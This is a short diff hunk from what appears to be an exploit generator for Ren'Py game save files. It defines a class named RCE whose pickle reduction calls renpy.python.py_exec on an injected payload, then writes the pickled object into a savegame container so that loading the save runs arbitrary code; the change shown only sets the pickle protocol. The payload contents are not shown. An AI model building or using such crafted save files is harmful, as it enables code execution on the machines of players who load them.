@@ -117,7 +117,7 @@ class RCE(object):
         return renpy.python.py_exec, (SCRIPT_PREFIX + payload + SCRIPT_SUFFIX,)
 
 
-pickled = pickle.dumps(RCE())
+pickled = pickle.dumps(RCE(), protocol=2)
 with open("savegame_container/log", "wb") as f:
     f.write(pickled)
 
